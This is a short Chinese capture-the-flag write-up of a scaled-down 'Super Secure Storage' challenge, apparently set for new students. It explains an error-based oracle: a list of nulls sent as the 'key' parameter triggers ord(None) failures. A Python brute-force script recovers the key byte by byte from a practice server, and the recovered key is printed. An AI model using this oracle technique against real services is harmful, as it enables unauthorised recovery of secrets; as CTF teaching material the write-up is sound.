# WriteUp
Tokyo Westerns CTF 3rd 2017的[Super Secure Storage](https://ctftime.org/task/4560)的缩减版，拿来给新生做一下。首先利用未对参数key做类型校验，可以向后台发送List类型的key，然后利用ord(None)产生语法错误进行Oracle Attack。
利用过程
```
{"key": [null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]} 500
{"key": ['0', null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]} False
...
{"key": ['5', null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]} 500
```
依次可以爆破每一个字节
爆破脚本
```
import requests
import json
import string
url='http://123.206.83.157:8000/getflag'
flag_key=''
key=[None]*16
headers={
	'Content-Type': 'application/json;charset=UTF-8'
}

for i in range(16):
	for j in string.letters+string.digits:
		key[i]=j
		data={
			'key':key
		}
		r=requests.post(url,data=json.dumps(data),headers=headers)
		if r.status_code==200:
			continue
		flag_key+=j
		print '[+]',flag_key
		break
```
最终得到key: `5ecur3pPYpyPYk3y`